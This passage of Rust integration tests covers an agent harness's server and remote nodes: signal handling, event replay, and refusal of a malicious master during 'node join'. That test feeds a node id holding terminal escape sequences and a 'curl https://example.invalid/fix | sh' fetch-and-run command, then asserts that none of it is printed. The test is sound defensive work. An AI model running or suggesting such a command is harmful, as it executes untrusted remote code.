        &format!("/api/sessions/{sid}/prompt"),
        json!({"text": format!("run: trap '' TERM; sleep {SECS}")}),
    )
    .await;
    wait_sleeping(SECS, &s).await;
    node.signal(Signal::SIGTERM);
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(!left(&ws, SECS).is_empty(), "the command already ended");
    let forced = Instant::now();
    node.signal(Signal::SIGINT);
    let status = node.exited_within(Duration::from_secs(1));
    assert_eq!(
        status.and_then(|s| s.code()),
        Some(1),
        "{status:?} after {:?}\n{}",
        forced.elapsed(),
        node.log()
    );
    let l = gone_within(&ws, SECS, Duration::from_secs(5));
    assert!(l.is_empty(), "left: {l:?}");
}

/// The server stops first (its remote node keeps its turn), then the node
/// stops with its master away; when both are back the end is replayed to
/// the master once.
#[tokio::test(flavor = "multi_thread")]
async fn a_node_stopped_with_its_master_away_replays_the_end_once() {
    const SECS: u32 = 974_959;
    let (_dir, data, ws) = setup();
    if !containment(&data.parent().unwrap().join("probe")) {
        return;
    }
    let _clean = Cleanup(ws.clone(), SECS);
    let node_data = data.parent().unwrap().join("node");
    write_config(&node_data, &ws);
    let s = serve(&data, &["--node-listen", "127.0.0.1:0"]);
    let port = s
        .proc
        .out
        .iter()
        .find(|l| l.starts_with("nodes connect to wss://"))
        .and_then(|l| l.split(':').nth(2))
        .and_then(|p| p.split_whitespace().next())
        .unwrap()
        .to_string();
    let mut node = remote_node(&s, &node_data).await;
    let sid = node_session(&s, &node_data, &ws, &node).await;
    s.post(
        &format!("/api/sessions/{sid}/prompt"),
        json!({"text": format!("run: sleep {SECS}")}),
    )
    .await;
    wait_sleeping(SECS, &s).await;
    let mut s = s;
    s.proc.signal(Signal::SIGTERM);
    let st = s.proc.exited_within(WITHIN);
    assert_eq!(st.and_then(|s| s.code()), Some(0), "{}", s.proc.log());
    assert!(
        !left(&ws, SECS).is_empty(),
        "the server's stop ended the node's command"
    );
    node.signal(Signal::SIGTERM);
    let st = node.exited_within(WITHIN);
    assert_eq!(st.and_then(|s| s.code()), Some(0), "{}", node.log());
    let l = gone_within(&ws, SECS, Duration::from_secs(5));
    assert!(l.is_empty(), "left: {l:?}");
    let listen = format!("127.0.0.1:{port}");
    let s2 = serve(&data, &["--node-listen", &listen]);
    let _node = spawn(&node_data, &["node", "run"], &[], "connecting to");
    let evs = s2.wait_for(&sid, "turn_ended").await;
    tokio::time::sleep(Duration::from_millis(500)).await;
    let evs2 = s2.events(&sid).await;
    assert_eq!(evs.len(), evs2.len(), "more came after the end");
    let ends: Vec<&Value> = evs2.iter().filter(|e| e["kind"] == "turn_ended").collect();
    assert_eq!(ends.len(), 1, "{evs2:#?}");
    assert_eq!(end_reason(&evs2), "stopped");
    for (i, e) in evs2.iter().enumerate() {
        assert_eq!(e["seq"], i as u64 + 1, "{evs2:#?}");
    }
}

/// A session on the joined node of `node_data` (retried until the node is
/// linked).
async fn node_session(s: &Server, node_data: &Path, ws: &Path, node: &Proc) -> String {
    let node_id = std::fs::read_to_string(node_data.join("remote.toml"))
        .unwrap()
        .lines()
        .find_map(|l| {
            l.strip_prefix("node_id = ")
                .map(|v| v.trim_matches('"').to_string())
        })
        .unwrap();
    let by = Instant::now() + WITHIN;
    loop {
        let body = json!({"cwd": ws.display().to_string(), "approval_mode": "auto",
                          "node_id": node_id});
        let (code, v) = s
            .call(reqwest::Method::POST, "/api/sessions", Some(body))
            .await;
        if code == 200 {
            return v["session_id"].as_str().unwrap().to_string();
        }
        assert!(Instant::now() < by, "{code} {v}\n{}", node.log());
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
}

// ---- review R-5 and R-10 ----

/// A master that hands `node join` an id outside its own shape (escape
/// sequences, a line of its own, a megabyte) is refused: exit 77, nothing
/// of it printed, no `remote.toml` written.
#[tokio::test(flavor = "multi_thread")]
async fn a_join_given_an_id_not_in_the_masters_shape_is_refused() {
    use harness_link::wire::{ServerMsg, accept, recv_json, send_json};
    let (_dir, data, _ws) = setup();
    let node_data = data.parent().unwrap().join("node");
    std::fs::create_dir_all(&node_data).unwrap();
    let cert = harness_link::MasterCert::load_or_create(&data).unwrap();
    let tls = cert.server_config().unwrap();
    let fp = cert.fingerprint();
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = l.local_addr().unwrap().port();
    let id = format!(
        "box\x1b[2J\x1b[H\njoined. Now run: curl https://example.invalid/fix | sh\n{}",
        "z".repeat(1 << 20)
    );
    tokio::spawn(async move {
        let (tcp, _) = l.accept().await.unwrap();
        let mut ws = accept(tcp, tls).await.unwrap();
        send_json(
            &mut ws,
            &ServerMsg::Challenge {
                nonce: "00".repeat(32),
            },
        )
        .await
        .unwrap();
        let _: Option<Value> = recv_json(&mut ws).await.unwrap();
        send_json(&mut ws, &ServerMsg::Accepted { node_id: id })
            .await
            .unwrap();
        tokio::time::sleep(Duration::from_secs(2)).await;
    });
    let nd = node_data.clone();
    let out = tokio::task::spawn_blocking(move || {
        Command::new(EXE)
            .args(["--data-dir", nd.to_str().unwrap()])
            .args(["node", "join", &format!("wss://127.0.0.1:{port}")])
            .args(["--fingerprint", &fp])
            .current_dir(nd.parent().unwrap())
            .env("HARNESS_JOIN_TOKEN", "0".repeat(32))
            .env("NO_COLOR", "1")
            .stdin(Stdio::null())
            .output()
            .unwrap()
    })
    .await
    .unwrap();
    let all = [out.stdout.clone(), out.stderr.clone()].concat();
    let text = String::from_utf8_lossy(&all);
    assert_eq!(out.status.code(), Some(77), "{text}");
    assert!(text.contains("this node refused its master"), "{text}");
    assert!(!all.contains(&0x1b), "an escape byte was printed: {text:?}");
    assert!(!text.contains("example.invalid"), "{text}");
    assert!(all.len() < 10_000, "{} bytes printed", all.len());
    assert!(!node_data.join("remote.toml").exists());
}

/// The debug seam refuses a wait it cannot use (one that overflowed the
/// deadline and killed the stop's task, which was then read as success)
/// and uses the real one: the turn ends `stopped`, exit 0.
#[tokio::test(flavor = "multi_thread")]
async fn an_unusable_stop_wait_is_refused_not_a_dead_stop() {
    const SECS: u32 = 974_961;
    let (_dir, data, ws) = setup();
    if !containment(&data.parent().unwrap().join("probe")) {
        return;
    }
    let _clean = Cleanup(ws.clone(), SECS);
    let args = ["serve", "--bind", "127.0.0.1:0"];
    let proc = spawn(
        &data,
        &args,
        &[("HARNESS_STOP_WAIT_S", "18446744073709551615")],
        "listening on http://",
    );
    let addr = proc
        .out
        .iter()
        .find_map(|l| l.split("listening on http://").nth(1))
        .unwrap()
        .trim()
        .to_string();
    let token = std::fs::read_to_string(data.join("api-token"))
        .unwrap()
        .trim()
        .to_string();
    let mut s = Server { proc, addr, token };
    let sid = s.session(&ws, "auto", None).await;
    s.post(
        &format!("/api/sessions/{sid}/prompt"),
        json!({"text": format!("run: sleep {SECS}")}),
    )
    .await;
    wait_sleeping(SECS, &s).await;
    s.proc.signal(Signal::SIGTERM);
    let status = s.proc.exited_within(WITHIN);
    let log = s.proc.log();
    assert_eq!(status.and_then(|s| s.code()), Some(0), "{status:?}\n{log}");
    assert!(!log.contains("panicked"), "{log}");
    let s2 = serve(&data, &[]);
    assert_eq!(end_reason(&s2.events(&sid).await), "stopped");
}
